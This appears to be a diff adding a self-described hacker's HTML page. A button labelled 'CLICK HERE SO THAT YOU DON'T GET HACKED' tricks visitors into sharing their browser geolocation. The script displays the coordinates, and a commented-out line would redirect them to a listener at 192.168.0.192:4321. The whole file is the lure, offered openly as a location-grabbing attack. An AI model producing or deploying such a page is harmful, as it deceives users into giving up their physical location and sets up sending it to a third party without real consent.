@@ -1,0 +1,37 @@
+<!DOCTYPE html> 
+<html>
+ <body>
+ <p>Hacker Loi Gets Your Location</p> 
+<button onclick="getLocation()">CLICK HERE SO THAT YOU DON'T GET HACKED</button> 
+<p id="demo"></p> 
+<script>
+ var x = document.getElementById("demo");
+ function getLocation() 
+{ 
+if (navigator.geolocation) 
+{ 
+navigator.geolocation.getCurrentPosition(showPosition, errorCallback, { timeout : 5000 }); 
+}
+ else
+ { 
+x.innerHTML = "Geolocation is not supported by this browser."; 
+} 
+}
+
+function showPosition(position) 
+{ 
+var latlong = x.innerHTML = "Latitude : " + position.coords.latitude + "<br>Longitude: " + position.coords.longitude;
+
+ //document.location='http://192.168.0.192:4321/'+latlong;
+
+ } 
+
+function errorCallback(error)
+ { 
+x.innerHTML = "failed";
+ } 
+
+</script>
+
+</body>
+</html>
